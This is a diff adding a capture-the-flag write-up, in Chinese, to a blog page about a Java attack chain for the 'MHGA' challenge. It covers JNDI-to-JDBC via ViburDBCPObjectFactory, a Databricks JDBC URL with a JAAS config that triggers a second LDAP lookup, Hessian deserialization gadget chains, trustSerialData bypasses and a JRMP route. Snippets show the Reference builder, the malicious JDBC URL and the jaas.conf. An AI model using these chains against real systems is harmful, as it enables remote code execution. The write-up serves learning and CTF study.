@@ -717,6 +717,157 @@
 <p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20260319210502051.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20260319210502051.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20260319210502051"></p>
 <p>调了一晚上，不ez &#x2F;(ㄒoㄒ)&#x2F;~~</p>
 <p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20260319212655536.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20260319212655536.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20260319212655536"></p>
+<h2 id="MHGA"><a href="#MHGA" class="headerlink" title="MHGA"></a>MHGA</h2><p>Make Hessian Great Again</p>
+<h3 id="mcp测试-1"><a href="#mcp测试-1" class="headerlink" title="mcp测试"></a>mcp测试</h3><p>题目提示hessian，不过依旧先mcp过一遍先</p>
+<p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20260320141439182.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20260320141439182.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20260320141439182"></p>
+<p>感觉能分析出7788了，他提到的jdk11&#x2F;HessianProxyFactory&#x2F;ViburDBCObjectFactory也确实被用到了</p>
+<h3 id="摘要"><a href="#摘要" class="headerlink" title="摘要"></a>摘要</h3><p>面对答案复现</p>
+<p>ViburDBCPObjectFactory JNDI-&gt;</p>
+<p>Databricks JDBC Attack-&gt;JDBC to JNDI-&gt;</p>
+<p>HessianProxyFactory JNDI-&gt;</p>
+<p>JavaUtils.writeBytesToFilename + System.load</p>
+<p>为什么不直接调用HessianProxyFactory JNDI？</p>
+<p>题目只有InitialContext.lookup，而HessianProxyFactory返回的动态Proxy对象无法调用obj.xxx()这种方法去触发invoke，所以外套</p>
+<p>中间还有trustSerialData 绕过的姿势，不过这个绕过现在没看懂，可能是之前没写过Ldap JNDI Server的原因，分析后再看吧</p>
+<h3 id="ViburDBCPObjectFactory-JNDI-to-JDBC"><a href="#ViburDBCPObjectFactory-JNDI-to-JDBC" class="headerlink" title="ViburDBCPObjectFactory JNDI to JDBC"></a>ViburDBCPObjectFactory JNDI to JDBC</h3><p>首先InitialContext.loop 的JNDI找继承了ObjectFactory的类，触发方法为getObjectInstance不用多说</p>
+<p>详细解释一下getObjectInstance怎么触发JDBC的吧，因为之前没看过Hikari的JNDI转JDBC来着</p>
+<p>ViburDBCPObjectFactory.getObjectInstance会调用ViburDBCPDataSource.start()</p>
+<p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20260320144017157.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20260320144017157.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20260320144017157"></p>
+<p>start-&gt;doStart，doStart函数里调用了initialJdbcDriver初始化driver，然后根据driver获取connector，然后初始化ConcurrentPool</p>
+<p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20260320154642140.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20260320154642140.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20260320154642140"></p>
+<p>initialJdbcDriver可以指定Driver和jdbcurl</p>
+<p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20260320154759156.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20260320154759156.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20260320154759156"></p>
+<p>ConcurrentPool构造函数里，availableSize&#x3D;&#x3D;0调用了addInitialObjects</p>
+<p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20260320154909683.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20260320154909683.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20260320154909683"></p>
+<p>addInitialObjects循环initialSize，调用了poolObjectFactory.create()</p>
+<p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20260320155004972.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20260320155004972.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20260320155004972"></p>
+<p>转到ConnecttionFactory.create，调用了connector.connect，完成jdbc连接</p>
+<p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20260320155057297.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20260320155057297.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20260320155057297"></p>
+<p>那怎么传入jdbcurl&#x2F;username&#x2F;password&#x2F;driver等值呢？</p>
+<p>ViburDBCPObjectFactory.getObjectInstance会从接收到的obj(Reference)对象中循环setProperty赋值，所以传Reference就行了</p>
+<p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20260320155601802.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20260320155601802.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20260320155601802"></p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Reference</span> <span class="variable">ref</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Reference</span>(<span class="string">&quot;javax.sql.DataSource&quot;</span>, <span class="string">&quot;org.vibur.dbcp.ViburDBCPObjectFactory&quot;</span>, <span class="literal">null</span>);</span><br><span class="line">ref.add(<span class="keyword">new</span> <span class="title class_">StringRefAddr</span>(<span class="string">&quot;driverClassName&quot;</span>, props.getProperty(<span class="string">&quot;driver&quot;</span>)));</span><br><span class="line">ref.add(<span class="keyword">new</span> <span class="title class_">StringRefAddr</span>(<span class="string">&quot;jdbcUrl&quot;</span>, props.getProperty(<span class="string">&quot;url&quot;</span>)));</span><br><span class="line">ref.add(<span class="keyword">new</span> <span class="title class_">StringRefAddr</span>(<span class="string">&quot;username&quot;</span>, <span class="string">&quot;test&quot;</span>));</span><br><span class="line">ref.add(<span class="keyword">new</span> <span class="title class_">StringRefAddr</span>(<span class="string">&quot;password&quot;</span>, <span class="string">&quot;test&quot;</span>));</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (props.getProperty(<span class="string">&quot;sql&quot;</span>) != <span class="literal">null</span>) &#123;</span><br><span class="line">    ref.add(<span class="keyword">new</span> <span class="title class_">StringRefAddr</span>(<span class="string">&quot;initSQL&quot;</span>, props.getProperty(<span class="string">&quot;sql&quot;</span>)));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>这里的driver和url还要改的</p>
+<blockquote>
+<p>知道这里能JNDI触发JDBC，为了方便可以AI写一个Reference封装org.vibur.dbcp.ViburDBCPObjectFactory去触发jdbc连接的代码</p>
+</blockquote>
+<h3 id="databricks-jdbc-attack-to-JNDI"><a href="#databricks-jdbc-attack-to-JNDI" class="headerlink" title="databricks jdbc attack to JNDI"></a>databricks jdbc attack to JNDI</h3><p>databricks 能通过krbJAASFile参数从本地或远程加载配置文件，再次触发JNDI注入</p>
+<p><a target="_blank" rel="noopener" href="https://blog.pyn3rd.com/2024/12/13/Databricks-JDBC-Attack-via-JAAS/">https://blog.pyn3rd.com/2024/12/13/Databricks-JDBC-Attack-via-JAAS/</a></p>
+<p>jdbc url如下</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">jdbc:databricks:<span class="comment">//127.0.0.1:443;AuthMech=1;KrbAuthType=1;httpPath=/;KrbHostFQDN=test;KrbServiceName=test;krbJAASFile=/tmp/jaas.conf&quot;;</span></span><br></pre></td></tr></table></figure>
+
+<p>jaas.conf如下</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">Client &#123;</span><br><span class="line">com.sun.security.auth.<span class="keyword">module</span>.JndiLoginModule required</span><br><span class="line">    user.provider.url=<span class="string">&quot;ldap://127.0.0.1:1389/wr4euw&quot;</span></span><br><span class="line">    group.provider.url=<span class="string">&quot;test&quot;</span></span><br><span class="line">    useFirstPass=<span class="literal">true</span></span><br><span class="line">    serviceName=<span class="string">&quot;test&quot;</span></span><br><span class="line">    debug=<span class="literal">true</span>;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
+
+<p>想看下怎么触发的，按理说这里搭个环境调试下就行了，奈何我真的懒得要命，ai依赖症犯了</p>
+<p>我勒个豆，ai秒了</p>
+<p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20260320203533113.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20260320203533113.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20260320203533113"></p>
+<p>最后还是调试了），这是栈，只能说ai是神</p>
+<p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20260320212622770.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20260320212622770.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20260320212622770"></p>
+<p>经过乱七八糟的字段判断，会调用Kerberos的认证，那么就要获取配置文件。调用Kerberos.getSubjectViaJAASConfig获取配置文件</p>
+<p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20260320213047880.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20260320213047880.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20260320213047880"></p>
+<p>那还说啥了，根据栈里的DownloadableFetchClientFactory#createClient和HiveServer2ClientFactory#createTransport，Config还支持http&#x2F;https协议读取</p>
+<p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20260320214040297.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20260320214040297.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20260320214040297"></p>
+<p>Kerberos.getSubjectViaJAASConfig会调用Configuration.getConfiguration()解析配置文件，然后调用LoginContext.login</p>
+<p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20260320214414768.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20260320214414768.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20260320214414768"></p>
+<p>经过ConfigFile的实例化后，把com.sun.security.auth.module.JndiLoginModule这种配置内容都配置进去了</p>
+<p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20260320220024144.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20260320220024144.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20260320220024144"></p>
+<p>书接上文，LoginContext.login经过一堆调用会调用到JndiLoginModule</p>
+<p>JndiLoginModule.login会调用attemptAuthentication</p>
+<p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20260320201430283.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20260320201430283.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20260320201430283"></p>
+<p>进而触发jndi，而且这里lookup完会去调用他的search方法，而不是直接像题目一样lookup就结束了，这样就会触发Proxy.invoke，不过这里lookup的返回值强转为了DirContext才能调用</p>
+<p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20260320201506931.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20260320201506931.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20260320201506931"></p>
+<p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20260321113527992.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20260321113527992.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20260321113527992"></p>
+<p>所以可以称为：二次JNDI？</p>
+<h3 id="HessianProxyFactory-JNDI-to-Hessian反序列化"><a href="#HessianProxyFactory-JNDI-to-Hessian反序列化" class="headerlink" title="HessianProxyFactory JNDI to Hessian反序列化"></a>HessianProxyFactory JNDI to Hessian反序列化</h3><p>HessianProxyFactory.getObjectInstance中，从reference中读取字段赋值，type&#x2F;url&#x2F;user&#x2F;password（这里url可以支持http等协议），然后调用create去实例化HessianProxy这个动态代理类</p>
+<p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20260321115747750.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20260321115747750.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20260321115747750"></p>
+<p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20260321120049740.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20260321120049740.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20260321120049740"></p>
+<p>HessianProxy.invoke会调用readReply，这里InputStream为Hessian2Input</p>
+<p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20260321120309466.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20260321120309466.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20260321120309466"></p>
+<p>跟进到Hessian2Input.readReply，调用了this.readObject，典型的hessian反序列化</p>
+<p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20260321120453986.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20260321120453986.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20260321120453986"></p>
+<blockquote>
+<p><code>HessianProxyFactory</code> 本质上是为 Hessian Web RPC 服务的，服务端暴露一个可以接收 Hessian 序列化数据的 <code>HessianServlet</code>，然后客户端就可以通过动态代理的方式与服务端的 Servlet 交互，实现 RPC 调用</p>
+<p>Ref:<a target="_blank" rel="noopener" href="https://su18.org/post/hessian/#%E6%8E%A5%E5%8F%A3%E7%9A%84%E6%9A%B4%E9%9C%B2%E4%B8%8E%E8%AE%BF%E9%97%AE">https://su18.org/post/hessian/#%E6%8E%A5%E5%8F%A3%E7%9A%84%E6%9A%B4%E9%9C%B2%E4%B8%8E%E8%AE%BF%E9%97%AE</a></p>
+</blockquote>
+<p>另外还有一个我们最开始看到的类，BurlapProxyFactory，他的代码和HessianProxyFactory几乎一模一样，不过这里用的api.getClassLoader</p>
+<p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20260321124808056.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20260321124808056.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20260321124808056"></p>
+<p>不过这里通过loader获取类加载器，而api是javax.naming.directory.DirContext及其子类，都是jdk内的类。通过这种方式获取的类加载器都是BootStrap，没法加载第三方jar，导致报错。</p>
+<h3 id="Hessian反序列化"><a href="#Hessian反序列化" class="headerlink" title="Hessian反序列化"></a>Hessian反序列化</h3><p>这个超全：</p>
+<p><a target="_blank" rel="noopener" href="https://1diot9.github.io/2026/03/06/Hessian%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%95%B4%E7%90%86/">https://1diot9.github.io/2026/03/06/Hessian%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%95%B4%E7%90%86/</a></p>
+<p>我曹，关注了1diot9，这链子图无敌了，直接偷</p>
+<p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/JavaGadget.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/JavaGadget.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="JavaGadget"></p>
+<p>这里可以用两种打法</p>
+<ul>
+<li>打法1：hessian原生链</li>
+</ul>
+<p>createValue反射调用任意static方法和构造函数，因为这里没有newInstance</p>
+<p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20260321135711533.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20260321135711533.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20260321135711533"></p>
+<p>HashMap.readObject -&gt; AbstractMap.equals -&gt; javax.swing.UIDefaults$TextAndMnemonicHashMap.get-&gt;getFromHashtable-&gt;SwingLazyValue(only jdk8)&#x2F;javax.swing.UIDefaults$ProxyLazyValue.createValue-&gt;JavaUtils.writeBytesToFilename(FileWrite)&#x2F;System.load</p>
+<p>SwingLazyValue jdk8以上没了，所以jdk11用UIDefaults$ProxyLazyValue打，写dll+load加载或者CPX都可以，反正出网</p>
+<p>另外反射调用MethodUtil#invoke可以扩大到任意方法，进而加载字节码&#x2F;Runtime&#x2F;signedObject</p>
+<ul>
+<li>打法2：</li>
+</ul>
+<p>另外Hessian反序列化除了触发put，还有hashCode&#x2F;equals&#x2F;compareTo</p>
+<p>HashMap.readObject -&gt; AbstractMap.equals -&gt; javax.swing.UIDefaults$TextAndMnemonicHashMap.get -&gt; toString</p>
+<p>这里还有com.databricks.client.jdbc.internal.fasterxml.jackson，也有pojoNode，所以拼上结束</p>
+<p>POJONode.toString -&gt; JSON.writeValueAsString -&gt;getter</p>
+<blockquote>
+<p>多提一嘴，getter一般是打TemplatesImpl，不过Hessian不能反序列化transient会导致初始化TemplatesImpl报错的问题</p>
+<p>Linux有sun.print.UnixPrintService的printer可以携带参数，然后里面有好多getter都会execCmd该参数的内容，不过这个类只在windows下有，而且是私有+没继承Serializable接口，但是在不需要Serializable场景下调用getter（hessian)就会触发漏洞，因为是私有类所以fastjson&#x2F;jackson&#x2F;snakeYaml这种几乎不用考虑了</p>
+<p><a target="_blank" rel="noopener" href="https://aecous.github.io/2023/10/01/%E5%88%9D%E6%8E%A2UnixPrintService/">https://aecous.github.io/2023/10/01/%E5%88%9D%E6%8E%A2UnixPrintService/</a></p>
+</blockquote>
+<p>因为前面有强转为DirContext，所以这里Proxy也需要代理DirContext</p>
+<h3 id="JNDI-trustSerialData限制"><a href="#JNDI-trustSerialData限制" class="headerlink" title="JNDI trustSerialData限制"></a>JNDI trustSerialData限制</h3><p>下文介绍了JNDI修复的记录</p>
+<p><a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s/0Ak9SzG8fnfh3d5llb-TFw">https://mp.weixin.qq.com/s/0Ak9SzG8fnfh3d5llb-TFw</a></p>
+<p>本体pom.xml给出了jdk版本为11，如下版本开始trustSerialData&#x3D;false</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">openjdk 8u432/11.0.25/17.0.13</span><br><span class="line">oraclejdk 8u461/11.0.28/17.0.16</span><br></pre></td></tr></table></figure>
+
+<p>根据如下文章</p>
+<p><a target="_blank" rel="noopener" href="https://github.com/H4cking2theGate/ysogate/blob/master/docs/JNDIMode.md">https://github.com/H4cking2theGate/ysogate/blob/master/docs/JNDIMode.md</a></p>
+<p><code>com.sun.jndi.ldap.object.trustSerialData</code>属性为<code>false</code>，无法在com.sun.jndi.ldap.Obj#decodeObject中反序列化，绕过方式主要有：</p>
+<ul>
+<li>ldap2rmi</li>
+</ul>
+<p>通过设置javaRemoteLocation来使用com.sun.jndi.ldap.Obj#decodeRmiObject还原Factory对象，从ldap转换成rmi进行绕过。</p>
+<ul>
+<li>onlyRef</li>
+</ul>
+<p>利用本地Factory进行攻击时，可以通过设置<code>objectClass</code>为<code>javaNamingReference</code>来避免进行反序列化，利用decodeReference来还原Factory对象，不适用于BeanFactory绕过，因为BeanFactory需要ResourceRef类型。</p>
+<p>显然onlyRef是可以的，因为并没有用到BeanFactory</p>
+<p>未实现绕过的原始ldapAtkServer来自marshalsec:</p>
+<p><a target="_blank" rel="noopener" href="https://github.com/mbechler/marshalsec/blob/master/src/main/java/marshalsec/jndi/LDAPRefServer.java">https://github.com/mbechler/marshalsec/blob/master/src/main/java/marshalsec/jndi/LDAPRefServer.java</a></p>
+<p>基于这上面叫ai改就行了</p>
+<p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20260321163006360.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20260321163006360.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20260321163006360"></p>
+<p>原来ldap是能打Reference的噢，看来又得修改知识库了，原来以为只有RMI+Reference</p>
+<h3 id="非预期"><a href="#非预期" class="headerlink" title="非预期"></a>非预期</h3><p>JNDI可以打JRMP，因为POJONode原生反序列化能直接触发RCE，所以用JRMP Listener返回Pojo链就RCE了</p>
+<p>额，我其实有个疑问是因为JEP290，高版本不是不能打JRMP了吗</p>
+<blockquote>
+<h2 id="关于JRMP的两种攻击流程如下"><a href="#关于JRMP的两种攻击流程如下" class="headerlink" title="关于JRMP的两种攻击流程如下"></a>关于JRMP的两种攻击流程如下</h2><h3 id="第一种攻击方式"><a href="#第一种攻击方式" class="headerlink" title="第一种攻击方式"></a>第一种攻击方式</h3><p>个人理解：基于RMI的反序列化中的客户端打服务端的类型</p>
+<p>我们需要先发送指定的payload（JRMPListener）到存在漏洞的服务器中，使得该服务器反序列化完成我们的payload后会开启一个RMI的服务监听在设置的端口上。</p>
+<p>我们还需要在我们自己的服务器使用exploit（JRMPClient）与存在漏洞的服务器进行通信，并且发送一个利用链，达到一个命令执行的效果。</p>
+<p>简单来说就是将一个payload（JRMPListener）发送到存在漏洞的服务器，存在漏洞的服务器反序列化操作该payload（JRMPListener）过后会在指定的端口开启RMI监听，然后再通过exploit（JRMPClient） 去发送利用链载荷，最终在存在漏洞的服务器上进行反序列化操作。二次反序列化这一块</p>
+<h3 id="第二种攻击方式"><a href="#第二种攻击方式" class="headerlink" title="第二种攻击方式"></a>第二种攻击方式</h3><p>个人理解：基于RMI的反序列化中的服务端打客户端的类型，这种攻击方式在实战中比较常用</p>
+<p>将exploit（JRMPListener）作为攻击方进行监听。</p>
+<p>我们发送指定的payloads（JRMPClient）使得存在漏洞的服务器向我们的exploit（JRMPListener）进行连接，连接后exploit（JRMPListener）则会返回给存在漏洞的服务器序列化的对象，而存在漏洞的服务器接收到了则进行反序列化操作，从而进行命令执行的操作。</p>
+<p>PS：这里的payload和exploit就是指的不同包下的JRMPListener和JRMPClient！</p>
+<p>Ref：<a target="_blank" rel="noopener" href="https://www.cnblogs.com/zpchcbd/p/14934168.html">https://www.cnblogs.com/zpchcbd/p/14934168.html</a></p>
+<p>而且这里开监听用的是yso exploit下的代码，另一端执行用的payloads下的代码。打JNDI的话直接输地址就行了，连Client都省了</p>
+</blockquote>
+<p>所以第二种打法是无版本限制的</p>
+<blockquote>
+<p>另外，当个乐子看，在 exploit&#x2F;JRMPListener 和 payloads&#x2F;JRMPClient 的利用过程中，这个 server 端和 client  端，攻击者和受害者的角色是可以互换的，在你去打别人的过程中，很有可能被反手一下，所以最好的情况就是，只是发送数据，不去接受另一端传过来的信息，所以说用这个 exploit&#x2F;JRMPClient 是不会自己打自己的</p>
+</blockquote>
+<p>所以如果打JRMPLisenter，这里的poc是直接改ysoserial的这里，好像不用改源码也行？参数指定就行了</p>
+<p><a target="_blank" rel="noopener" href="https://github.com/1diot9/CTFSolutions/blob/main/idea/2026/AliyunCTF/MHGA/src/main/java/solution/JRMPListener.java">https://github.com/1diot9/CTFSolutions/blob/main/idea/2026/AliyunCTF/MHGA/src/main/java/solution/JRMPListener.java</a></p>
+<p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20260321153108038.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20260321153108038.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20260321153108038"></p>
+<p>Client直接lookup</p>
+<p><code>initialContext.lookup(&quot;rmi://127.0.0.1:1399/any&quot;);</code></p>
+<p>这也就解释了，为什么非预期是直接打的TemplatesImpl，因为是JRMP原生反序列化，并不是hessian，当然能直接打了。</p>
+<p>payload代码就不写了，看起来乱乱的</p>
+<p>别人写了：<a target="_blank" rel="noopener" href="https://github.com/1diot9/CTFSolutions/blob/main/idea/2026/AliyunCTF/MHGA/src/main/java/solution">https://github.com/1diot9/CTFSolutions/blob/main/idea/2026/AliyunCTF/MHGA/src/main/java/solution</a></p>
 
       </div>
       <div class="post-tags-categories">
@@ -993,7 +1144,7 @@
   <div class='content'>
     <div class="toc-main">
       <div class="toc-content">
-        <!-- <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#fileury"><span class="toc-text">fileury</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#mcp%E6%B5%8B%E8%AF%95"><span class="toc-text">mcp测试</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%86%99%E6%96%87%E4%BB%B6%E5%8A%A0%E8%BD%BD-dnsns-or-jce-jar"><span class="toc-text">写文件加载 dnsns or jce jar</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8D%95%E6%AC%A1%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96poc"><span class="toc-text">单次反序列化poc</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BA%8C%E6%AC%A1%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96"><span class="toc-text">二次反序列化</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BA%8C%E6%AC%A1%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96poc"><span class="toc-text">二次反序列化poc</span></a></li></ol></li></ol> -->
+        <!-- <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#fileury"><span class="toc-text">fileury</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#mcp%E6%B5%8B%E8%AF%95"><span class="toc-text">mcp测试</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%86%99%E6%96%87%E4%BB%B6%E5%8A%A0%E8%BD%BD-dnsns-or-jce-jar"><span class="toc-text">写文件加载 dnsns or jce jar</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8D%95%E6%AC%A1%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96poc"><span class="toc-text">单次反序列化poc</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BA%8C%E6%AC%A1%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96"><span class="toc-text">二次反序列化</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BA%8C%E6%AC%A1%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96poc"><span class="toc-text">二次反序列化poc</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#MHGA"><span class="toc-text">MHGA</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#mcp%E6%B5%8B%E8%AF%95-1"><span class="toc-text">mcp测试</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%91%98%E8%A6%81"><span class="toc-text">摘要</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#ViburDBCPObjectFactory-JNDI-to-JDBC"><span class="toc-text">ViburDBCPObjectFactory JNDI to JDBC</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#databricks-jdbc-attack-to-JNDI"><span class="toc-text">databricks jdbc attack to JNDI</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#HessianProxyFactory-JNDI-to-Hessian%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96"><span class="toc-text">HessianProxyFactory JNDI to Hessian反序列化</span></a></li><li class="toc-item toc-level-3"><a 